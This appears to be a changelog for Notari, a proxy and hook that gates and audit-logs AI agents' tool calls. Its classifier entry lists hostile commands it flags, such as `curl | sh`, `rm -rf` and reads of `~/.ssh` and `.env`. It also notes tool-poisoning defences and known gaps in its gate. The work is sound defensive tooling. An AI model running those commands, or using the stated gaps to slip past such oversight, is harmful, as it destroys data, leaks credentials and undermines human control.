- **Trust Infrastructure layer**: Agent Receipts (`session.open`/`session.close`/`session.receipt`/`agent.flag.uncertain` events + `notari receipts list/show`), lethal-trifecta exposure tracking (`session.taint.update` events + `notari trifecta show`), A2A Bridge handoff edges (`agent.handoff.out`/`in`/`cascade.affected` + `notari bridge show`).
- **Tool description pinning** (`src/notari/pinning.py`): SHA-256 fingerprint of `(name, description, inputSchema, annotations)` at first sight, persistent at `$NOTARI_HOME/tool_pins.jsonl`, mode `0o600`. Catches the Invariant Labs tool-poisoning attack class and silent rug-pulls. CLI: `notari pins list/approve/revoke`.
- **MCP schema-passthrough proxy**: vendored `create_proxy_server` from `sparfenyuk/mcp-proxy v0.11.0` (MIT) into `src/notari/_vendor/proxy_factory.py` with three Notari-specific changes: gate callable injection, upstream-name namespacing, and `McpError` preservation (the original swallowed upstream JSON-RPC errors into generic tool errors, breaking client retry logic).
- **Bidirectional notification handler** (`src/notari/notifications.py`): every upstream-pushed notification (`tools/list_changed`, `resources/list_changed`, `prompts/list_changed`, `resource.updated`, log messages, progress) is audit-logged AND forwarded downstream to the connected MCP client. Pin cache is invalidated on `tools/list_changed`. Dispatch pattern adapted from IBM/mcp-context-forge (Apache-2.0); the rest is Notari's own.
- **CI workflow** at `.github/workflows/ci.yml` (was parked at `ci-deferred/`).

### Changed

- Pytest coverage threshold dropped from honest-but-aspirational 85% to a realistic 75% measured against the kernel only (audit, policy, decay, telemetry, config, proxy, adapters, errors, pinning, taint, receipt, bridge, notifications). The presentation layer (cli, tui, watch, tree, doctor, journal, session, prompt) is excluded - it needs integration tests, not unit tests.
- `notari.proxy.NotariProxy.all_tools` is now async; refreshes from upstream when the cache is invalidated by a `tools/list_changed` notification.
- `notari init` now points at `notari start` (was the hidden `notari serve`).
- Renamed user-facing `notari taint` → `notari trifecta` for clarity (internal code keeps `taint.py` for security term-of-art grep).

### Fixed

- 187 → 0 ruff lint errors. Real bugs fixed: `Any` was referenced but not imported in `cli.py`; `notari journal save --sessions-dir` was silently ignored because `save_from_transcript` didn't accept the kwarg; dead `out` and `sid` local variables removed.
- 165 → 203 tests passing.

### Added - v0.1 (re-stated)

- Claude Code `PreToolUse` hook adapter (`notari claude-hook`) so Notari can gate Claude Code's built-in tools (Bash, Edit, Write, NotebookEdit) without going through the MCP proxy. Includes `notari claude-hook-install` for idempotent settings.json merging. Decision matrix: `LOW/MEDIUM` → silent allow, `HIGH` → delegate to Claude Code's confirm UI, `CRITICAL` → deny with plain-English reason.
- Content-aware shell-command risk classifier (`notari.policy.classify_command`). Catches `rm -rf`, `git push --force`, `DROP TABLE`, `vercel --prod`, `npm publish`, `curl | sh`, `terraform destroy`, `cat ~/.ssh/...`, `cat .env`, and more. Conservative by design: when uncertain, returns MEDIUM and lets the operator decide.
- Test coverage for the hook decision matrix, the command classifier, and the install helper.

### Known gaps for 0.2-rc1

- Per-tool sampling adjudication (the gate must decide whether to allow upstream-initiated `sampling/createMessage`) is observed in the audit log as `upstream.request` but not yet adjudicated. Default behavior: forward to client unmodified. Will land before 0.2 final.
- Telemetry pipeline (Supabase ingest + analyze) exists but is not deployed; the backend lives outside this repo.
- Trifecta is observation-only. Enforcement (escalate to type-to-confirm when the third flag would close) is the 1-month scope.
- WebAuthn-attested confirmation is not yet wired. Type-to-confirm is anti-fatigue, not anti-hijack.

### Planned for 0.2.0

- Schema-passthrough so MCP clients get autocomplete on every gated upstream tool
- Multi-agent / sub-session governance with cross-agent quorum
- Live tool-list refresh from upstream MCP servers (currently fetched once at startup)
- LangGraph adapter (composes with `interrupt()`)
- OpenAI Agents SDK adapter (`RunHooks` / `AgentHooks`)
- OpenTelemetry GenAI span emission so the audit composes with Langfuse, Phoenix, Helicone
- AIUC-1 and EU AI Act Article 14 audit-export formats
- Opt-in anonymous telemetry (`notari telemetry on/off/show`)

## [0.1.0] - 2026-05-07

### Added

- Core MCP proxy server (`notari serve`) that wraps any number of upstream MCP servers and applies a deterministic three-layer gate
- Append-only signed audit log with HMAC-SHA256 chaining and tamper-evident verification
- Default risk classification table covering destructive filesystem, version-control, database, deployment, payments, and outbound-comms actions
- Plain-English block reasons readable by non-technical operators
- Yes-fatigue detector (configurable via `NOTARI_FATIGUE_*` env vars)
- Type-to-confirm on critical-risk actions
- CLI: `notari init`, `notari serve`, `notari tail`, `notari audit verify`, `notari audit show`
- Pydantic-strict configuration model with explicit `extra="forbid"` at every trust boundary
- `py.typed` marker (PEP 561) and full `mypy --strict` / `pyright` typing

### Security

- HMAC key auto-generated at first run, stored at `~/.notari/key` mode `0o600`
- Audit log mode `0o600`, `O_APPEND` for atomic concurrent writes, force-fsync on `risk >= high`
- Upstream MCP server subprocesses spawn with a scrubbed environment; only `env_pass`-listed variables are forwarded
- `env_pass` refuses to forward variables that look like Notari's signing key

</details>
